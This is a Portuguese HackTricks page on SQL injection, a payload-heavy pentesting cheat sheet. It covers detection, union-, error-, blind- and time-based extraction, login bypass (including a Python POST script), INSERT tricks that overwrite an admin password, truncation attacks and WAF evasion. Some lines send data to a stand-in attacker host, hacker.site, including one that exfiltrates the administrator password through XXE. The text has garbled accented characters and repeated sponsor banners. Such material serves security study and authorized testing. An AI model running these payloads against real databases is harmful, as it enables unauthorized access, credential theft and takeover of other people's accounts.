# Inje√ß√£o de SQL

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Voc√™ trabalha em uma **empresa de ciberseguran√ßa**? Gostaria de ver sua **empresa anunciada no HackTricks**? ou gostaria de ter acesso √† **√∫ltima vers√£o do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**üí¨**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Compartilhe seus truques de hacking enviando PRs para o [reposit√≥rio hacktricks](https://github.com/carlospolop/hacktricks) e [reposit√≥rio hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## O que √© inje√ß√£o de SQL?

Uma **inje√ß√£o de SQL** √© uma falha de seguran√ßa que permite que atacantes **interfiram em consultas de banco de dados** de um aplicativo. Essa vulnerabilidade pode permitir que os atacantes **visualizem**, **modifiquem** ou **excluam** dados aos quais n√£o deveriam ter acesso, incluindo informa√ß√µes de outros usu√°rios ou quaisquer dados aos quais o aplicativo possa acessar. Tais a√ß√µes podem resultar em altera√ß√µes permanentes na funcionalidade ou conte√∫do do aplicativo ou at√© mesmo comprometer o servidor ou negar o servi√ßo.


## Detec√ß√£o do ponto de entrada

Quando um site parece ser **vulner√°vel a inje√ß√£o de SQL (SQLi)** devido a respostas incomuns do servidor a entradas relacionadas ao SQLi, o **primeiro passo** √© entender como **injetar dados na consulta sem interromp√™-la**. Isso requer identificar o m√©todo para **escapar do contexto atual** de forma eficaz.
Aqui est√£o alguns exemplos √∫teis:
```
[Nothing]
'
"
`
')
")
`)
'))
"))
`))
```
Ent√£o, voc√™ precisa saber como **corrigir a consulta para que n√£o haja erros**. Para corrigir a consulta, voc√™ pode **inserir** dados para que a **consulta anterior aceite os novos dados**, ou simplesmente **inserir** seus dados e **adicionar um s√≠mbolo de coment√°rio no final**.

_Observe que se voc√™ puder ver mensagens de erro ou identificar diferen√ßas quando uma consulta est√° funcionando e quando n√£o est√°, esta fase ser√° mais f√°cil._

### **Coment√°rios**
```sql
MySQL
#comment
-- comment     [Note the space after the double dash]
/*comment*/
/*! MYSQL Special SQL */

PostgreSQL
--comment
/*comment*/

MSQL
--comment
/*comment*/

Oracle
--comment

SQLite
--comment
/*comment*/

HQL
HQL does not support comments
```
### Confirma√ß√£o com opera√ß√µes l√≥gicas

Um m√©todo confi√°vel para confirmar uma vulnerabilidade de inje√ß√£o de SQL envolve a execu√ß√£o de uma **opera√ß√£o l√≥gica** e observar os resultados esperados. Por exemplo, um par√¢metro GET como `?username=Peter` que produz conte√∫do id√™ntico quando modificado para `?username=Peter' or '1'='1` indica uma vulnerabilidade de inje√ß√£o de SQL.

Da mesma forma, a aplica√ß√£o de **opera√ß√µes matem√°ticas** serve como uma t√©cnica de confirma√ß√£o eficaz. Por exemplo, se acessar `?id=1` e `?id=2-1` produzirem o mesmo resultado, isso √© indicativo de uma inje√ß√£o de SQL.

Exemplos demonstrando a confirma√ß√£o com opera√ß√µes l√≥gicas:
```
page.asp?id=1 or 1=1 -- results in true
page.asp?id=1' or 1=1 -- results in true
page.asp?id=1" or 1=1 -- results in true
page.asp?id=1 and 1=2 -- results in false
```
Esta lista de palavras foi criada para tentar **confirmar SQLinjections** da maneira proposta:

{% file src="../../.gitbook/assets/sqli-logic.txt" %}

### Confirmando com Timing

Em alguns casos, voc√™ **n√£o notar√° nenhuma altera√ß√£o** na p√°gina que est√° testando. Portanto, uma boa maneira de **descobrir inje√ß√µes de SQL cegas** √© fazer o BD realizar a√ß√µes que ter√£o um **impacto no tempo** que a p√°gina precisa para carregar.\
Portanto, vamos concatenar na consulta SQL uma opera√ß√£o que levar√° muito tempo para ser conclu√≠da:
```
MySQL (string concat and logical ops)
1' + sleep(10)
1' and sleep(10)
1' && sleep(10)
1' | sleep(10)

PostgreSQL (only support string concat)
1' || pg_sleep(10)

MSQL
1' WAITFOR DELAY '0:0:10'

Oracle
1' AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])
1' AND 123=DBMS_PIPE.RECEIVE_MESSAGE('ASD',10)

SQLite
1' AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))
1' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
```
Em alguns casos, as **fun√ß√µes de sleep n√£o ser√£o permitidas**. Em vez de usar essas fun√ß√µes, voc√™ pode fazer a consulta **realizar opera√ß√µes complexas** que levar√£o v√°rios segundos. _Exemplos dessas t√©cnicas ser√£o comentados separadamente em cada tecnologia (se houver)_.

### Identificando o Back-end

A melhor maneira de identificar o back-end √© tentar executar fun√ß√µes dos diferentes back-ends. Voc√™ pode usar as _**fun√ß√µes de sleep**_ da se√ß√£o anterior ou estas (tabela de [payloadsallthethings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#dbms-identification):
```bash
["conv('a',16,2)=conv('a',16,2)"                   ,"MYSQL"],
["connection_id()=connection_id()"                 ,"MYSQL"],
["crc32('MySQL')=crc32('MySQL')"                   ,"MYSQL"],
["BINARY_CHECKSUM(123)=BINARY_CHECKSUM(123)"       ,"MSSQL"],
["@@CONNECTIONS>0"                                 ,"MSSQL"],
["@@CONNECTIONS=@@CONNECTIONS"                     ,"MSSQL"],
["@@CPU_BUSY=@@CPU_BUSY"                           ,"MSSQL"],
["USER_ID(1)=USER_ID(1)"                           ,"MSSQL"],
["ROWNUM=ROWNUM"                                   ,"ORACLE"],
["RAWTOHEX('AB')=RAWTOHEX('AB')"                   ,"ORACLE"],
["LNNVL(0=123)"                                    ,"ORACLE"],
["5::int=5"                                        ,"POSTGRESQL"],
["5::integer=5"                                    ,"POSTGRESQL"],
["pg_client_encoding()=pg_client_encoding()"       ,"POSTGRESQL"],
["get_current_ts_config()=get_current_ts_config()" ,"POSTGRESQL"],
["quote_literal(42.5)=quote_literal(42.5)"         ,"POSTGRESQL"],
["current_database()=current_database()"           ,"POSTGRESQL"],
["sqlite_version()=sqlite_version()"               ,"SQLITE"],
["last_insert_rowid()>1"                           ,"SQLITE"],
["last_insert_rowid()=last_insert_rowid()"         ,"SQLITE"],
["val(cvar(1))=1"                                  ,"MSACCESS"],
["IIF(ATN(2)>0,1,0) BETWEEN 2 AND 0"               ,"MSACCESS"],
["cdbl(1)=cdbl(1)"                                 ,"MSACCESS"],
["1337=1337",   "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
["'i'='i'",     "MSACCESS,SQLITE,POSTGRESQL,ORACLE,MSSQL,MYSQL"],
```
Tamb√©m, se tiver acesso √† sa√≠da da consulta, voc√™ poderia fazer com que **imprimisse a vers√£o do banco de dados**.

{% hint style="info" %}
A seguir, vamos discutir diferentes m√©todos para explorar diferentes tipos de Inje√ß√£o de SQL. Vamos usar o MySQL como exemplo.
{% endhint %}

### Identificando com PortSwigger

{% embed url="https://portswigger.net/web-security/sql-injection/cheat-sheet" %}

## Explorando Baseado em Uni√£o

### Detectando o n√∫mero de colunas

Se voc√™ puder ver a sa√≠da da consulta, esta √© a melhor maneira de explor√°-la.\
Primeiramente, precisamos descobrir o **n√∫mero** de **colunas** que a **solicita√ß√£o inicial** est√° retornando. Isso ocorre porque **ambas as consultas devem retornar o mesmo n√∫mero de colunas**.\
Dois m√©todos s√£o tipicamente usados para este prop√≥sito:

#### Order/Group by

Para determinar o n√∫mero de colunas em uma consulta, ajuste incrementalmente o n√∫mero usado nas cl√°usulas **ORDER BY** ou **GROUP BY** at√© receber uma resposta falsa. Apesar das funcionalidades distintas de **GROUP BY** e **ORDER BY** dentro do SQL, ambos podem ser utilizados de forma id√™ntica para determinar a contagem de colunas da consulta.
```sql
1' ORDER BY 1--+    #True
1' ORDER BY 2--+    #True
1' ORDER BY 3--+    #True
1' ORDER BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```

```sql
1' GROUP BY 1--+    #True
1' GROUP BY 2--+    #True
1' GROUP BY 3--+    #True
1' GROUP BY 4--+    #False - Query is only using 3 columns
#-1' UNION SELECT 1,2,3--+    True
```
#### UNION SELECT

Selecione mais e mais valores nulos at√© que a consulta esteja correta:
```sql
1' UNION SELECT null-- - Not working
1' UNION SELECT null,null-- - Not working
1' UNION SELECT null,null,null-- - Worked
```
_Deve-se usar valores `null` pois em alguns casos o tipo das colunas de ambos os lados da consulta deve ser o mesmo e null √© v√°lido em todos os casos._

### Extrair nomes de bancos de dados, nomes de tabelas e nomes de colunas

Nos exemplos a seguir, vamos recuperar o nome de todos os bancos de dados, o nome da tabela de um banco de dados, os nomes das colunas da tabela:
```sql
#Database names
-1' UniOn Select 1,2,gRoUp_cOncaT(0x7c,schema_name,0x7c) fRoM information_schema.schemata

#Tables of a database
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,table_name,0x7C) fRoM information_schema.tables wHeRe table_schema=[database]

#Column names
-1' UniOn Select 1,2,3,gRoUp_cOncaT(0x7c,column_name,0x7C) fRoM information_schema.columns wHeRe table_name=[table name]
```
_Existe uma maneira diferente de descobrir esses dados em cada banco de dados diferente, mas a metodologia √© sempre a mesma._

## Explorando a Inje√ß√£o Baseada em Uni√£o Oculta

Quando a sa√≠da de uma consulta √© vis√≠vel, mas uma inje√ß√£o baseada em uni√£o parece inating√≠vel, isso significa a presen√ßa de uma **inje√ß√£o baseada em uni√£o oculta**. Esse cen√°rio frequentemente leva a uma situa√ß√£o de inje√ß√£o cega. Para transformar uma inje√ß√£o cega em uma baseada em uni√£o, a consulta de execu√ß√£o no backend precisa ser discernida.

Isso pode ser realizado por meio do uso de t√©cnicas de inje√ß√£o cega juntamente com as tabelas padr√£o espec√≠ficas do seu Sistema de Gerenciamento de Banco de Dados (DBMS) de destino. Para entender essas tabelas padr√£o, √© aconselh√°vel consultar a documenta√ß√£o do DBMS de destino.

Uma vez que a consulta foi extra√≠da, √© necess√°rio adaptar sua carga √∫til para fechar com seguran√ßa a consulta original. Posteriormente, uma consulta de uni√£o √© anexada √† sua carga √∫til, facilitando a explora√ß√£o da nova inje√ß√£o baseada em uni√£o acess√≠vel.

Para obter insights mais abrangentes, consulte o artigo completo dispon√≠vel em [Healing Blind Injections](https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f).

## Explorando a Base de Erros

Se, por algum motivo, voc√™ **n√£o pode** ver a **sa√≠da** da **consulta** mas consegue **ver as mensagens de erro**, voc√™ pode usar essas mensagens de erro para **extrair** dados do banco de dados.\
Seguindo um fluxo semelhante √† explora√ß√£o Baseada em Uni√£o, voc√™ poderia conseguir extrair o banco de dados.
```sql
(select 1 and row(1,1)>(select count(*),concat(CONCAT(@@VERSION),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))
```
## Explorando Blind SQLi

Neste caso, voc√™ n√£o consegue ver os resultados da consulta ou os erros, mas consegue distinguir quando a consulta retorna uma resposta verdadeira ou falsa porque existem conte√∫dos diferentes na p√°gina.\
Neste caso, voc√™ pode abusar desse comportamento para extrair o banco de dados caractere por caractere:
```sql
?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
```
## Explorando Error Blind SQLi

Este √© o **mesmo caso que antes**, mas em vez de distinguir entre uma resposta verdadeira/falsa da consulta, voc√™ pode **distinguir entre** um **erro** na consulta SQL ou n√£o (talvez porque o servidor HTTP falhe). Portanto, neste caso, voc√™ pode for√ßar um erro SQL cada vez que acertar o caractere:
```sql
AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- -
```
## Explorando SQLi Baseado em Tempo

Neste caso, **n√£o h√°** nenhuma maneira de **distinguir** a **resposta** da consulta com base no contexto da p√°gina. No entanto, voc√™ pode fazer a p√°gina **demorar mais para carregar** se o caractere adivinhado estiver correto. J√° vimos essa t√©cnica sendo usada anteriormente para [confirmar uma vulnerabilidade de SQLi](./#confirming-with-timing).
```sql
1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
```
## Consultas Empilhadas

Voc√™ pode usar consultas empilhadas para **executar v√°rias consultas em sucess√£o**. Observe que, enquanto as consultas subsequentes s√£o executadas, os **resultados** **n√£o s√£o retornados para a aplica√ß√£o**. Portanto, essa t√©cnica √© principalmente √∫til em rela√ß√£o a **vulnerabilidades cegas** onde voc√™ pode usar uma segunda consulta para acionar uma pesquisa de DNS, erro condicional ou atraso de tempo.

**Oracle** n√£o suporta **consultas empilhadas**. **MySQL, Microsoft** e **PostgreSQL** as suportam: `CONSULTA-1-AQUI; CONSULTA-2-AQUI`

## Explora√ß√£o Fora de Banda

Se **nenhum outro** m√©todo de explora√ß√£o **funcionar**, voc√™ pode tentar fazer com que o **banco de dados exfiltre** as informa√ß√µes para um **host externo** controlado por voc√™. Por exemplo, por meio de consultas DNS:
```sql
select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
```
### Exfiltra√ß√£o de dados fora da banda via XXE
```sql
a' UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.hacker.site/"> %remote;]>'),'/l') FROM dual-- -
```
## Explora√ß√£o Automatizada

Consulte a [SQLMap Cheetsheat](sqlmap/) para explorar uma vulnerabilidade de SQLi com [**sqlmap**](https://github.com/sqlmapproject/sqlmap).

## Informa√ß√µes espec√≠ficas da tecnologia

J√° discutimos todas as maneiras de explorar uma vulnerabilidade de Inje√ß√£o de SQL. Encontre mais truques dependentes da tecnologia do banco de dados neste livro:

* [MS Access](ms-access-sql-injection.md)
* [MSSQL](mssql-injection.md)
* [MySQL](mysql-injection/)
* [Oracle](oracle-injection.md)
* [PostgreSQL](postgresql-injection/)

Ou voc√™ encontrar√° **muitos truques relacionados a: MySQL, PostgreSQL, Oracle, MSSQL, SQLite e HQL em** [**https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection**](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)



<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover o conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Bypass de Autentica√ß√£o

Lista para tentar burlar a funcionalidade de login:

{% content-ref url="../login-bypass/sql-login-bypass.md" %}
[sql-login-bypass.md](../login-bypass/sql-login-bypass.md)
{% endcontent-ref %}

### Bypass de Autentica√ß√£o de Hash Bruto
```sql
"SELECT * FROM admin WHERE pass = '".md5($password,true)."'"
```
Este query demonstra uma vulnerabilidade quando o MD5 √© usado com true para sa√≠da bruta em verifica√ß√µes de autentica√ß√£o, tornando o sistema suscet√≠vel a inje√ß√£o de SQL. Os atacantes podem explorar isso criando inputs que, quando hashados, produzem partes inesperadas de comandos SQL, resultando em acesso n√£o autorizado.
```sql
md5("ffifdyop", true) = 'or'6ÔøΩ]ÔøΩÔøΩ!r,ÔøΩÔøΩbÔøΩ
sha1("3fDf ", true) = QÔøΩu'='ÔøΩ@ÔøΩ[ÔøΩtÔøΩ- oÔøΩÔøΩ_-!
```
### Bypass de Autentica√ß√£o de Hash Injetado
```sql
admin' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'
```
**Lista recomendada**:

Voc√™ deve usar como nome de usu√°rio cada linha da lista e sempre a senha: _**Pass1234.**_\
_(Esses payloads tamb√©m est√£o inclu√≠dos na grande lista mencionada no in√≠cio desta se√ß√£o)_

{% file src="../../.gitbook/assets/sqli-hashbypass.txt" %}

### GBK Autentica√ß√£o Bypass

SE ' est√° sendo escapado, voc√™ pode usar %A8%27 e quando ' for escapado, ser√° criado: 0xA80x5c0x27 (_‚ïò'_)
```sql
%A8%27 OR 1=1;-- 2
%8C%A8%27 OR 1=1-- 2
%bf' or 1=1 -- --
```
Script Python:
```python
import requests
url = "http://example.com/index.php"
cookies = dict(PHPSESSID='4j37giooed20ibi12f3dqjfbkp3')
datas = {"login": chr(0xbf) + chr(0x27) + "OR 1=1 #", "password":"test"}
r = requests.post(url, data = datas, cookies=cookies, headers={'referrer':url})
print r.text
```
### Inje√ß√£o Poliglota (multicontexto)
```sql
SLEEP(1) /*' or SLEEP(1) or '" or SLEEP(1) or "*/
```
## Instru√ß√£o de Inser√ß√£o

### Modificar senha de objeto/usu√°rio existente

Para fazer isso, voc√™ deve tentar **criar um novo objeto com o nome do "objeto principal"** (provavelmente **admin** no caso de usu√°rios) modificando algo:

* Criar usu√°rio com o nome: **AdMIn** (letras mai√∫sculas e min√∫sculas)
* Criar um usu√°rio com o nome: **admin=**
* **Ataque de Truncamento SQL** (quando h√° algum tipo de **limite de comprimento** no nome de usu√°rio ou e-mail) --> Criar usu√°rio com o nome: **admin \[muitos espa√ßos] a**

#### Ataque de Truncamento SQL

Se o banco de dados for vulner√°vel e o n√∫mero m√°ximo de caracteres para o nome de usu√°rio for, por exemplo, 30 e voc√™ deseja se passar pelo usu√°rio **admin**, tente criar um nome de usu√°rio chamado: "_admin \[30 espa√ßos] a_" e qualquer senha.

O banco de dados ir√° **verificar** se o **nome de usu√°rio** **introduzido** **existe** no banco de dados. Se **n√£o**, ele ir√° **cortar** o **nome de usu√°rio** para o **n√∫mero m√°ximo de caracteres permitidos** (neste caso para: "_admin \[25 espa√ßos]_") e ent√£o **remover√° automaticamente todos os espa√ßos no final atualizando** no banco de dados o usu√°rio "**admin**" com a **nova senha** (algum erro pode aparecer, mas isso n√£o significa que n√£o funcionou).

Mais informa√ß√µes: [https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html](https://blog.lucideus.com/2018/03/sql-truncation-attack-2018-lucideus.html) & [https://resources.infosecinstitute.com/sql-truncation-attack/#gref](https://resources.infosecinstitute.com/sql-truncation-attack/#gref)

_Nota: Este ataque n√£o funcionar√° mais conforme descrito acima nas √∫ltimas instala√ß√µes do MySQL. Embora as compara√ß√µes ainda ignorem espa√ßos em branco no final por padr√£o, tentar inserir uma string que seja mais longa que o comprimento de um campo resultar√° em um erro, e a inser√ß√£o falhar√°. Para mais informa√ß√µes sobre isso, verifique: [https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation](https://heinosass.gitbook.io/leet-sheet/web-app-hacking/exploitation/interesting-outdated-attacks/sql-truncation)_

### Verifica√ß√£o baseada em tempo de inser√ß√£o no MySQL

Adicione o m√°ximo de `','',''` que voc√™ considerar para sair da declara√ß√£o VALUES. Se houver um atraso na execu√ß√£o, voc√™ tem uma Inje√ß√£o SQL.
```sql
name=','');WAITFOR%20DELAY%20'0:0:5'--%20-
```
### ON DUPLICATE KEY UPDATE

A cl√°usula `ON DUPLICATE KEY UPDATE` no MySQL √© utilizada para especificar a√ß√µes para o banco de dados tomar quando uma tentativa √© feita de inserir uma linha que resultaria em um valor duplicado em um √≠ndice √öNICO ou CHAVE PRIM√ÅRIA. O exemplo a seguir demonstra como esse recurso pode ser explorado para modificar a senha de uma conta de administrador:

Exemplo de Inje√ß√£o de Payload:

Um payload de inje√ß√£o pode ser elaborado da seguinte forma, onde duas linhas s√£o tentadas a serem inseridas na tabela `users`. A primeira linha √© um engodo, e a segunda linha visa um e-mail de administrador existente com a inten√ß√£o de atualizar a senha:
```sql
INSERT INTO users (email, password) VALUES ("generic_user@example.com", "bcrypt_hash_of_newpassword"), ("admin_generic@example.com", "bcrypt_hash_of_newpassword") ON DUPLICATE KEY UPDATE password="bcrypt_hash_of_newpassword" -- ";
```
### Extrair informa√ß√µes

#### Criando 2 contas ao mesmo tempo

Ao tentar criar um novo usu√°rio e nome de usu√°rio, senha e e-mail s√£o necess√°rios:

- A consulta tenta inserir duas linhas: uma para `generic_user@example.com` e outra para `admin_generic@example.com`.
- Se a linha para `admin_generic@example.com` j√° existir, a cl√°usula `ON DUPLICATE KEY UPDATE` √© acionada, instruindo o MySQL a atualizar o campo `password` da linha existente para "bcrypt_hash_of_newpassword".
- Consequentemente, a autentica√ß√£o pode ent√£o ser tentada usando `admin_generic@example.com` com a senha correspondente ao hash bcrypt ("bcrypt_hash_of_newpassword" representa o hash bcrypt da nova senha, que deve ser substitu√≠do pelo hash real da senha desejada).
```
SQLi payload:
username=TEST&password=TEST&email=TEST'),('otherUsername','otherPassword',(select flag from flag limit 1))-- -

A new user with username=otherUsername, password=otherPassword, email:FLAG will be created
```
#### Usando decimal ou hexadecimal

Com esta t√©cnica, voc√™ pode extrair informa√ß√µes criando apenas 1 conta. √â importante notar que voc√™ n√£o precisa comentar nada.

Usando **hex2dec** e **substr**:
```sql
'+(select conv(hex(substr(table_name,1,6)),16,10) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
Para obter o texto, voc√™ pode usar:
```python
__import__('binascii').unhexlify(hex(215573607263)[2:])
```
Usando **hex** e **replace** (e **substr**):
```sql
'+(select hex(replace(replace(replace(replace(replace(replace(table_name,"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

'+(select hex(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'

#Full ascii uppercase and lowercase replace:
'+(select hex(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(substr(table_name,1,7),"j"," "),"k","!"),"l","\""),"m","#"),"o","$"),"_","%"),"z","&"),"J","'"),"K","`"),"L","("),"M",")"),"N","@"),"O","$$"),"Z","&&")) FROM information_schema.tables WHERE table_schema=database() ORDER BY table_name ASC limit 0,1)+'
```
‚Äã

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

‚Äã‚Äã‚Äã‚Äã‚Äã‚Äã[**RootedCON**](https://www.rootedcon.com/) √© o evento de ciberseguran√ßa mais relevante na **Espanha** e um dos mais importantes na **Europa**. Com **a miss√£o de promover o conhecimento t√©cnico**, este congresso √© um ponto de encontro fervilhante para profissionais de tecnologia e ciberseguran√ßa em todas as disciplinas.

{% embed url="https://www.rootedcon.com/" %}

## Inje√ß√£o SQL Roteada

A inje√ß√£o SQL roteada √© uma situa√ß√£o em que a consulta injet√°vel n√£o √© aquela que fornece a sa√≠da, mas a sa√≠da da consulta injet√°vel vai para a consulta que fornece a sa√≠da. ([Do Paper](http://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Routed%20SQL%20Injection%20-%20Zenodermus%20Javanicus.txt))

Exemplo:
```
#Hex of: -1' union select login,password from users-- a
-1' union select 0x2d312720756e696f6e2073656c656374206c6f67696e2c70617373776f72642066726f6d2075736572732d2d2061 -- a
```
## Bypass de WAF

[By-passes iniciais a partir daqui](https://github.com/Ne3o1/PayLoadAllTheThings/blob/master/SQL%20injection/README.md#waf-bypass)

### Bypass sem espa√ßos

Sem Espa√ßo (%20) - bypass usando alternativas de espa√ßamento
```sql
?id=1%09and%091=1%09--
?id=1%0Dand%0D1=1%0D--
?id=1%0Cand%0C1=1%0C--
?id=1%0Band%0B1=1%0B--
?id=1%0Aand%0A1=1%0A--
?id=1%A0and%A01=1%A0--
```
### No Whitespace - bypass usando coment√°rios

Em algumas situa√ß√µes, pode ser necess√°rio contornar restri√ß√µes de entrada de dados que pro√≠bem o uso de espa√ßos em branco. Uma t√©cnica comum para contornar essa restri√ß√£o √© usar coment√°rios SQL para "esconder" o c√≥digo SQL dentro deles. Isso permite executar consultas SQL mesmo sem a capacidade de inserir espa√ßos em branco diretamente.

Por exemplo, em vez de inserir uma instru√ß√£o SQL como:

```sql
SELECT * FROM users WHERE username = 'admin' AND password = 'password'
```

Voc√™ pode usar coment√°rios para contornar a restri√ß√£o de espa√ßos em branco, como:

```sql
SELECT/**/*/**/FROM/**/users/**/WHERE/**/username/**/=/**/'admin'/**/AND/**/password/**/=/**/'password'
```

Essa t√©cnica aproveita os coment√°rios SQL para separar as palavras-chave e os operadores, permitindo que a consulta seja executada sem a necessidade de espa√ßos em branco.
```sql
?id=1/*comment*/and/**/1=1/**/--
```
### Sem Espa√ßos - contornando usando par√™nteses

Neste desafio, o objetivo √© contornar a restri√ß√£o de n√£o poder usar espa√ßos em uma inje√ß√£o SQL, utilizando par√™nteses para separar os comandos. Isso pode ser √∫til em situa√ß√µes em que os espa√ßos s√£o filtrados, mas os par√™nteses n√£o s√£o.
```sql
?id=(1)and(1)=(1)--
```
### Sem v√≠rgulas de bypass

Sem v√≠rgulas - bypass usando OFFSET, FROM e JOIN
```
LIMIT 0,1         -> LIMIT 1 OFFSET 0
SUBSTR('SQL',1,1) -> SUBSTR('SQL' FROM 1 FOR 1).
SELECT 1,2,3,4    -> UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c JOIN (SELECT 4)d
```
### Desvios Gen√©ricos

Lista negra usando palavras-chave - desviar usando mai√∫sculas/min√∫sculas
```sql
?id=1 AND 1=1#
?id=1 AnD 1=1#
?id=1 aNd 1=1#
```
### Blacklist usando palavras-chave sem diferencia√ß√£o de mai√∫sculas e min√∫sculas - contornando usando um operador equivalente
```
AND   -> && -> %26%26
OR    -> || -> %7C%7C
=     -> LIKE,REGEXP,RLIKE, not < and not >
> X   -> not between 0 and X
WHERE -> HAVING --> LIMIT X,1 -> group_concat(CASE(table_schema)When(database())Then(table_name)END) -> group_concat(if(table_schema=database(),table_name,null))
```
### Nota√ß√£o Cient√≠fica para Bypass de WAF

Voc√™ pode encontrar uma explica√ß√£o mais detalhada desse truque no [blog da gosecure](https://www.gosecure.net/blog/2021/10/19/a-scientific-notation-bug-in-mysql-left-aws-waf-clients-vulnerable-to-sql-injection/).\
Basicamente, voc√™ pode usar a nota√ß√£o cient√≠fica de maneiras inesperadas para contornar o WAF:
```
-1' or 1.e(1) or '1'='1
-1' or 1337.1337e1 or '1'='1
' or 1.e('')=
```
### Bypassar Restri√ß√£o de Nomes de Colunas

Primeiramente, observe que se a **consulta original e a tabela de onde voc√™ deseja extrair a flag tiverem a mesma quantidade de colunas**, voc√™ pode simplesmente fazer: `0 UNION SELECT * FROM flag`

√â poss√≠vel **acessar a terceira coluna de uma tabela sem usar seu nome** usando uma consulta como a seguinte: `SELECT F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;`, ent√£o em uma inje√ß√£o de SQL isso ficaria assim:
```bash
# This is an example with 3 columns that will extract the column number 3
-1 UNION SELECT 0, 0, 0, F.3 FROM (SELECT 1, 2, 3 UNION SELECT * FROM demo)F;
```
Ou usando um **bypass de v√≠rgula**:
```bash
# In this case, it's extracting the third value from a 4 values table and returning 3 values in the "union select"
-1 union select * from (select 1)a join (select 2)b join (select F.3 from (select * from (select 1)q join (select 2)w join (select 3)e join (select 4)r union select * from flag limit 1 offset 5)F)c
```
Este truque foi retirado de [https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/](https://secgroup.github.io/2017/01/03/33c3ctf-writeup-shia/)

### Ferramentas sugeridas de bypass de WAF

{% embed url="https://github.com/m4ll0k/Atlas" %}

## Outros Guias

